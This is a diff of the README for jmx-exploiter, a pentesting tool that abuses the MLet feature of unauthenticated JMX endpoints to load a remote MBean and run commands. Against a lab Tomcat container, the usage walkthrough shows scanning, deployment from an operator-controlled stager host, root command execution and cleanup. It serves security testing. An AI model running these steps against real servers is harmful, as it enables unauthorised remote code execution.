@@ -1,6 +1,6 @@
 ## jmx-exploiter
 
-*jmx-exploiter* is a command line tool written in Java, that is designed to attack JMX endpoints. 
+*jmx-exploiter* is a command line tool written in Java, which helps to identify vulnerabilities on *JMX* endpoints.
 *JMX* stands for **Java Management Extensions** and can be used to monitor and configure the Java Virtual Machine
 from remote. Applications like *tomcat* or *JBoss* are often installed together with a *JMX* endpoint, which 
 enables server administrators to monitor and manage the corresponding application.
@@ -13,8 +13,11 @@ input and output to the *MBean* object.
 By default, *JMX* endpoints support a *MBean* with name **MLet**. This *MBean* can be used to deploy new *MBean* objects on the 
 *JMX* agent. The codebase for these new *MBean* objects can be gathered over the network e.g. in form of a HTTP request. Using
 the **MLet** feature, attackers with access to a *JMX* agent can easily deploy their own malicious *MBean* objects and 
-compromise the underlying application server. *jmx-exploiter* can support you during this part and handle the *MBean* deployment
-and interaction for you. 
+compromise the underlying application server. *jmx-exploiter* is a *Proof-of-Concept* tool, that can be used to
+identify vulnerable endpoints.
+
+![](https://github.com/qtc-de/jmx-exploiter/workflows/master%20maven%20CI/badge.svg?branch=master)
+![](https://github.com/qtc-de/jmx-exploiter/workflows/develop%20maven%20CI/badge.svg?branch=develop)
 
 
 ### Installation
@@ -24,14 +27,14 @@ and interaction for you.
 *jmx-exploiter* is a *Maven* project. This makes the installation a straight forward process and no manual installation of libraries
 should be required. First of all, make sure that you have *maven* installed on your system:
 
-```bash
-sudo apt install maven      # Debian
-pacman -s maven             # Arch
+```console
+$ sudo apt install maven      # Debian
+$ pacman -s maven             # Arch
 ```
 
 Then, clone the *jmx-exploiter* project in a location of your choice and run ``mvn package`` inside of the projects folder.
 
-```bash
+```console
 [pentester@kali opt]$ cd jmx-exploiter/
 [pentester@kali jmx-exploiter]$ mvn package
 [INFO] Scanning for projects...
@@ -43,12 +46,12 @@ Then, clone the *jmx-exploiter* project in a location of your choice and run ``m
 [...]
 ```
 
-Since the main purpose of *jmx-exploiter* is the deployment of malicious *MBean* objects, you need also a corresponding *MBean* object.
-Theoretically you can deploy any *MBean* object that fulfills the *MBean Specifications*. However, this project does also provide a reference
-implementation, the [tonka-bean](./tonka-bean/). The *tonka-bean* is a separate maven project and you can compile it in the same way as
+Since the main purpose of *jmx-exploiter* is the deployment of *MBean* objects, you need also a corresponding *MBean*.
+Theoretically you can deploy any *MBean* that fulfills the *MBean Specifications*. However, this project does also provide a reference
+implementation, the [tonka-bean](./tonka-bean/). The *tonka-bean* is a separate *maven* project and you can compile it in the same way as
 you compiled *jmx-exploiter*:
 
-```bash
+```console
 [pentester@kali jmx-exploiter]$ cd tonka-bean/
 [pentester@kali tonka-bean]$ mvn package
 [INFO] Scanning for projects...
@@ -62,25 +65,33 @@ you compiled *jmx-exploiter*:
 
 After *maven* has finished, you should find the executable *.jar* files in the target folders of the corresponding projects.
 
-```bash
+```console
 [pentester@kali opt]$ ls -l jmx-exploiter/target/jmx-exploiter.jar 
 -rw-r--r-- 1 pentester pentester 64393 Nov  5 07:21 jmx-exploiter/target/jmx-exploiter.jar
 [pentester@kali opt]$ ls -l jmx-exploiter/tonka-bean/target/tonka-bean.jar 
 -rw-r--r-- 1 pentester pentester 2636 Nov  5 07:23 jmx-exploiter/tonka-bean/target/tonka-bean.jar
 ```
 
+*jmx-exploiter* does also support autocompletion for bash. To take advantage of autocompletion, you need to have the
+[completion-helpers](https://github.com/qtc-de/completion-helpers) project installed. If setup correctly, just
+copying the [completion script](./resources/bash_completion.d/jmx-exploiter) to your ``~/.bash_completion.d`` enables
+autocompletion.
+
+```console
+[pentester@kali jmx-exploiter]$ cp resources/bash_completion.d/jmx-exploiter ~/bash_completion.d/
+```
 
 ### Usage
 
 -----
 
-In this chapter I want to show you the basic usage of *jmx-exploiter*. For demonstration purposes, I created a vulnerable docker container, running
+For demonstration purposes, I created a vulnerable docker container, running
 an *Apache Tomcat* server with a *JMX* agent listening on port 9010. The corresponding [docker-files](./.docker/)
 can be found inside this repository and should enable you to practice the usage of *jmx-exploiter* yourself. 
 
 The listing below shows the nmap output for the corresponding container. Using the NSE-Script *rmi-dumpregistry* you can verify that port 9010 is running a *JMX* agent.
 
-```bash
+```console
 [pentester@kali opt]$ sudo nmap -sV 172.30.0.2
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-05 07:24 CET
 Nmap scan report for 172.30.0.2
@@ -105,7 +116,7 @@ PORT     STATE SERVICE  VERSION
 [...]
 ```
 
-If you encounter a *JMX* endpoint during a pentest, you should first of all use [jconsole](https://docs.oracle.com/javase/7/docs/technotes/guides/management/jconsole.html)
+If you encounter a *JMX* endpoint, you should first of all use [jconsole](https://docs.oracle.com/javase/7/docs/technotes/guides/management/jconsole.html)
 to determine if you can connect to the *JMX* endpoint without valid credentials. Especially on *Tomcat* servers *jconsole* is interesting, since per default the credentials
 of *Tomcat users* are accessible over the *JMX* interface:
 
@@ -113,7 +124,7 @@ of *Tomcat users* are accessible over the *JMX* interface:
 
 However, with *jmx-exploiter* your first step is to launch the *status* command on the remote *JMX* endpoint:
 
-```bash
+```console
 [pentester@kali target]$ ./jmx-exploiter.jar 172.30.0.2 9010 status
 [+] Connecting to JMX server... done!
 [+] Creating MBeanServerConnection... done!
@@ -129,11 +140,9 @@ by using the *deployMLet* and *deployMBean* commands, or you can simply use *dep
 the remote server needs to establish a HTTP connection to your listener. Therefore, you might need a firewall whitelisting and you have to use the corresponding
 ``--stagerHost`` and ``--stagerPort`` options of *jmx-exploiter*, to specify where your listener can be found. You can also specify these options in a configuration file
 that looks like the one in the ``src`` folder of the project. The configuration file does also allow you to specify advanced options, like controlling the name of 
-the deployed *MBean*. Lastly, make sure that the *MBean* you want to deploy can be found in the path that is specified in your configuration file (default is: ``tonka-bean/target/``).
+the deployed *MBean*. Lastly, make sure that the *MBean* you want to deploy can be found in the path that is specified in your configuration file (default is: ``/opt/jmx-exploiter/tonka-bean/target/``).
 
-```bash
-[pentester@kali deploy]$ ls
-config.properties  jmx-exploiter.jar  tonka-bean
+```console
 [pentester@kali deploy]$ cat config.properties 
 defaultCmd=id
 stagerPort=8080
@@ -168,7 +177,7 @@ stagerHost=172.30.0.1
 The output suggests that the deployment worked like expected. You can verify this situation either by using the *status* command again, or by searching your *MBean*
 inside of *jconsole*:
 
-```bash
+```console
 [pentester@kali deploy]$ ./jmx-exploiter.jar 172.30.0.2 9010 status
 [+] Connecting to JMX server... done!
 [+] Creating MBeanServerConnection... done!
@@ -185,7 +194,7 @@ inside of *jconsole*:
 If you deployed your own malicious *MBean*, you can now invoke your *MBean* methods directly from *jconsole*. While this is also possible for the *tonka-bean*, *jmx-exploiter*
 also supports options to interact with the *tonka-bean* from the command line:
 
-```bash
+```console
 [pentester@kali deploy]$ ./jmx-exploiter.jar 172.30.0.2 9010 execute --exec id 
 [+] Connecting to JMX server... done!
 [+] Creating MBeanServerConnection... done!
@@ -197,7 +206,7 @@ also supports options to interact with the *tonka-bean* from the command line:
 Once you are done with your *MBean*, you should make sure to undeploy all changes that you have made to the server. At least you should remove your malicious *MBean* from the server, 
 but if *MLet* was not available when you started, you should also remove the *MLet*. *jmx-exploiter* makes the cleanup pretty easy, by just invoking:
 
-```bash
+```console
 [pentester@kali deploy]$ ./jmx-exploiter.jar -c config.properties 172.30.0.2 9010 undeployAll
 [+] Connecting to JMX server... done!
 [+] Creating MBeanServerConnection... done!
@@ -213,9 +222,9 @@ Now the *JMX* endpoint should be clean again and *MLet* and your malicious *MBea
 
 -----
 
-Recently I tested a host system that had a JMXMP (JMX Messaging Protocol) listener running. JMXMP is just an alternate way to access a JMX agent and differs in some
+*JMXMP* (JMX Messaging Protocol) is just an alternate way to access a JMX agent and differs in some
 points from the Java RMI access as described above. However, for the purpose of this tool, these differences do not really matter. The important thing is that also 
-the JMXMP connector can allow unauthenticated connections and it is also possible to use the **MLet MBean** over this connector. 
+the *JMXMP* connector can allow unauthenticated connections and it is also possible to use the *MLet MBean* over this connector. 
 
 The required classes for the JMXMP connector can be found inside a *.jar* file called *jmxremote_optional.jar*. Unfortunately, this *.jar* does not has its own project
 on Maven anymore (it seems like it was an artifact of the JMX project once, but was removed for some reason). Now, it can be loaded as an artifact of other projects.
@@ -267,7 +276,7 @@ just the same examples as above, but this time using the JMXMP protocol:
 [+] Servers answer is: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
 ```
 
-Also notice that you can use *jconsole* to connect to a running JMX agent via JMXMP. Instead of simply specifying the host and port number for the connection, 
+Also notice that you can use *jconsole* to connect to a running *JMX* agent via *JMXMP*. Instead of simply specifying the host and port number for the connection, 
 you have to use the JMXMP service URI ``service:jmx:jmxmp://<JMXMPHOST>:<JMXMPPORT>`` and you have to make sure that the *jmxremote_optional.jar* is inside your
 classpath.
 
@@ -289,7 +298,7 @@ username=null
 password=null
 boundName=jmxrmi
 
-jarPath=./tonka-bean/target/
+jarPath=/opt/jmx-exploiter/tonka-bean/target/
 jarName=tonka-bean.jar
 mLetName=DefaultDomain:type=MLet
 beanClass=de.qtc.tonkabean.TonkaBean
@@ -312,8 +321,8 @@ specific task, like a reverse shell. *jmx-exploiter* and the *tonka-bean* refere
 Furthermore, the code of the *tonka-bean* is available in plain Java and compilation is done on your own. You can determine exactly what the *MBean* is doing, modify things that
 you do not like, extend the *MBean* and you are safe from surprising side effects. 
 
-*jmx-exploiter* does support the JMXMP protocol. Beside Java RMI, JMXMP represents a second popular method to communicate with a running JMX agent. In contrast to the RMI approach, 
-JMXMP does not require an additional registry service and is therefore a good solution on restrictive fire-walled host systems. While other tools focus usually on the RMI access method,
+*jmx-exploiter* does support the *JMXMP* protocol. Beside Java *RMI*, *JMXMP* represents a second popular method to communicate with a running *JMX* agent. In contrast to the *RMI* approach, 
+*JMXMP* does not require an additional registry service and is therefore a good solution on restrictive fire-walled host systems. While other tools focus usually on the *RMI* access method,
 *jmx-exploiter* supports both for a maximum flexibility.
 
 Finally, I did not find any tool that supports a cleanup operation after the exploitation is done. E.g. Metasploit leaves an ugly named *MBean* inside of 
@@ -329,4 +338,4 @@ restore the clean state of the *JMX* endpoint.
 * For the JMXMP implementation, the tools provided by [nickman](https://github.com/nickman) were really helpful.
 
 
-Copyright 2019, Tobias Neitzel and contributors.
+Copyright 2020, Tobias Neitzel and the *jmx-exploiter* contributors.
